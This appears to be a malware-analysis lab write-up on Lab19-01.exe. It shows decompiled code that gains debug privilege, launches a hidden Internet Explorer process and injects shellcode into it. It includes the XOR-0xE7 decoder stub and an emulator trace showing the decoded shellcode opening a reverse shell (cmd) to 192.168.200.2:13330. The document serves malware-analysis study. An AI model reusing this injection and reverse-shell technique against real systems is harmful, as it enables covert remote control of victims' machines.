Lab19-01.exe
    # IDA Pro
        int __cdecl main(int argc, const char **argv, const char **envp)
        {
        int result; // eax
        BYTE Data; // [esp+4h] [ebp-A10h]
        char v5; // [esp+A08h] [ebp-Ch]
        int v6; // [esp+A0Ch] [ebp-8h]
        DWORD dwProcessId; // [esp+A10h] [ebp-4h]

        dwProcessId = 0;
        memset(&Data, 0, 0xA04u);
        v5 = 0;
        v6 = privilege_escalation(aSedebugprivile);
        if ( v6 )
        {
            v6 = reg_value_query(&Data, 2565);                          // HKCR\http\shell\open\command; To get path of iexplorer.exe
            if ( v6 )
            {
            printf(aGotPathS, &Data);
            v6 = Create_iexplorer_process(&Data, &dwProcessId);         // StartupInfo.wShowWindow = 0 > Hide the window
            if ( v6 )
            {
                v6 = sub_401230(dwProcessId, &unk_407030, 0x1A7u);      // inject shellcode(unk_407030) into the iexplorer.exe process

        .data:00407030 sub_407030      proc near               ; DATA XREF: _main+C8↑o
        .data:00407030                 jmp     short loc_407043
        .data:00407032 ; ---------------------------------------------------------------------------
        .data:00407032
        .data:00407032 loc_407032:                             ; CODE XREF: sub_407030:loc_407043↓p
        .data:00407032                 pop     edi
        .data:00407033                 push    small 18Fh
        .data:00407037                 pop     cx
        .data:00407039                 mov     al, 0E7h
        .data:0040703B
        .data:0040703B loc_40703B:                             ; CODE XREF: sub_407030+E↓j
        .data:0040703B                 xor     [edi], al
        .data:0040703D                 inc     edi
        .data:0040703E                 loopw   loc_40703B
        .data:00407041                 jmp     short loc_407048
        .data:00407043 ; ---------------------------------------------------------------------------
        .data:00407043
        .data:00407043 loc_407043:                             ; CODE XREF: sub_407030↑j
        .data:00407043                 call    loc_407032

        Copy from 407030 to end to a new file test.bin in WinHex
        XOR with E7

        C:\>scdbg.exe test.bin
        error setting working directory for drag and drop mode..exe=scdbg.exe
        Loaded 2fd0 bytes from file test.bin
        Initialization Complete..
        Max Steps: 2000000
        4010dcbaLoadLibraryA(ws2_32)
        401104  WSAStartup(101)
        401113  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
        401132  connect(h=42, host: 192.168.200.2 , port: 13330 ) = 42
        40117a  CreateProcessA( cmd,  ) = 0x1269
        40117d  GetCurrentProcess() = 1
        Stepcount 291448eProcess(1) = 1